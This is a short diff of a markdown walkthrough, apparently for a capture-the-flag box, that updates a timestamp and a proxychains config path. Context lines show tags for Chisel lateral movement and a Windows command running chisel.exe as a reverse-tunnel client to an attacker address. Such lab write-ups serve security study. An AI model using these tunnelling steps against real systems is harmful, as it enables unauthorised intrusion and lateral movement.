@@ -17,7 +17,7 @@ tags:
   - Lateral-Movement-Chisel-Proxy-Kali-amd64-to-windows-X86
   - Bloodhound-Vectory-Enroll
   - Port22-SSH-sshpass-File-Transfer
-lastmod: 2026-06-03T05:54:39.199Z
+lastmod: 2026-07-06T10:13:36.345Z
 ---
 # Box  Info
 
@@ -1118,7 +1118,7 @@ PS C:\Users\User\Desktop> C:\ProgramData\chisel.exe client 10.10.14.54:8080 R:so
 
 ```
 ┌──(haydon_env)─(root㉿kali)-[~/tools]
-└─# tail -n 20 /etc/proxychains4.conf          
+└─# tail -n 20 /etc/proxychains.conf          
 #
 #
 #        Examples:
